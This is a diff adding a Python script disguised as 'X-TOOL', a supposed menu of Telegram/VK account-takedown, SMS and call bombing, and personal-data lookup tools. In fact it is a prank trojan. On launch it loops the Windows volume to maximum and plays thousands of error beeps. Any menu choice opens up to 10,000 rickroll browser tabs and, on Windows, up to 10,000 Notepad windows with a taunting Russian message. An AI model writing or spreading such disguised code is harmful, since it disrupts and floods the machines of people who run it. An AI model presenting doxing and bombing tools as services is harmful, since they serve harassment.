@@ -1,0 +1,190 @@
+#!/usr/bin/env python3
+import os
+import time
+import platform
+import webbrowser
+import subprocess
+
+try:
+    import threading
+    import winsound
+    import time
+    from ctypes import cast, POINTER
+    from comtypes import CLSCTX_ALL
+    from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
+
+    # ===== MAX VOLUME LOOP =====
+    def max_volume_loop():
+        devices = AudioUtilities.GetSpeakers()
+        interface = devices.Activate(
+            IAudioEndpointVolume._iid_,
+            CLSCTX_ALL,
+            None
+        )
+        volume = cast(interface, POINTER(IAudioEndpointVolume))
+
+        while True:
+            volume.SetMasterVolumeLevelScalar(1.0, None)
+            volume.SetMute(0, None)
+            time.sleep(0.1)
+
+    # ===== WINDOWS ERROR SOUND LOOP =====
+    def sound_loop():
+
+        ERROR_COUNT = 10000
+
+        print("\n[+] WINDOWS ERROR SOUND MODULE STARTED...\n")
+
+        for i in range(ERROR_COUNT):
+
+            print(f"[{i+1}/{ERROR_COUNT}] Playing error sound...")
+
+            winsound.MessageBeep(winsound.MB_ICONHAND)
+
+            time.sleep(0.1)
+
+    threading.Thread(target=max_volume_loop, daemon=True).start()
+    threading.Thread(target=sound_loop, daemon=True).start()
+
+except:
+    pass
+
+
+def clear():
+    os.system("clear" if os.name != "nt" else "cls")
+
+
+def open_url(url):
+    system = platform.system()
+
+    if system == "Windows":
+        subprocess.Popen(["cmd", "/c", "start", "", url], shell=True)
+
+    elif system == "Linux":
+        subprocess.Popen(["xdg-open", url])
+
+    elif "Android" in platform.platform():
+        os.system(f'termux-open-url "{url}"')
+
+    else:
+        webbrowser.open_new_tab(url)
+
+
+def open_rickroll():
+
+    base_url = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
+
+    print("\n[+] INIT CLIENT STARTED...\n")
+
+    for i in range(10000):
+        url = base_url + f"&i={i}"
+
+        print(f"[{i+1}/1000] Opening rickroll...")
+        open_url(url)
+
+        time.sleep(0.0)
+
+    print("\n[!] SYSTEM FAILURE 🤡")
+    print("[!] CLOWN DETECTED")
+
+
+    if platform.system() == "Windows":
+
+        import tempfile
+
+        text = """Бесплатных софтов нету
+Иди посуду мой, клоун 🤡
+
+By |@Not3Rey| project"""
+
+        print("\n[+] WINDOWS NOTEPAD MODULE STARTED...\n")
+
+        for i in range(10000):
+
+            print(f"[{i+1}/1000] Opening notepad...")
+
+            path = os.path.join(
+                tempfile.gettempdir(),
+                f"xtool_note_{i}.txt"
+            )
+
+            with open(path, "w", encoding="utf-8") as f:
+                f.write(text)
+
+            os.system(f'start notepad "{path}"')
+
+            time.sleep(0.0)
+
+
+def banner():
+    print(r"""
+██╗  ██╗      ████████╗ ██████╗  ██████╗ ██╗
+╚██╗██╔╝      ╚══██╔══╝██╔═══██╗██╔═══██╗██║
+╚███╔╝ █████╗   ██║   ██║   ██║██║   ██║██║
+██╔██╗ ╚════╝   ██║   ██║   ██║██║   ██║██║
+██╔╝ ██╗        ██║   ╚██████╔╝╚██████╔╝███████╗
+╚═╝  ╚═╝        ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝
+
+        [ X-TOOL PRIVATE EDITION ]   By |@Not3Rey| project 
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+""")
+
+
+def menu():
+    print("""
+[1] TG Snoser        [7] Call Bomber
+[2] VK Snoser        [8] TG Bomber
+[3] Probiv nik       [9] Probiv IP
+[4] Probiv @user     [10] Probiv FIO
+[5] Probiv ID        [11] Machine
+[6] SMS Bomber       [12] Snos nomerov
+
+[13] Clear
+[14] Exit
+""")
+
+
+def prank():
+    clear()
+    print("""
+[+] Connecting...
+[+] Loading modules...
+[+] Access granted...
+""")
+
+    time.sleep(2)
+    clear()
+
+    print("""
+🤡 CLOWN DETECTED
+
+Бесплатных софтов нету.
+Иди посуду мой.
+""")
+
+    time.sleep(2)
+
+    open_rickroll()
+
+
+while True:
+    clear()
+    banner()
+    menu()
+
+    choice = input("root@xtool:~# ")
+
+    if choice == "14":
+        print("Exit...")
+        break
+
+    elif choice == "13":
+        clear()
+
+    elif choice in [str(i) for i in range(1, 13)]:
+        prank()
+        input("\nEnter to continue...")
+
+    else:
+        print("Invalid option")
+        time.sleep(1)
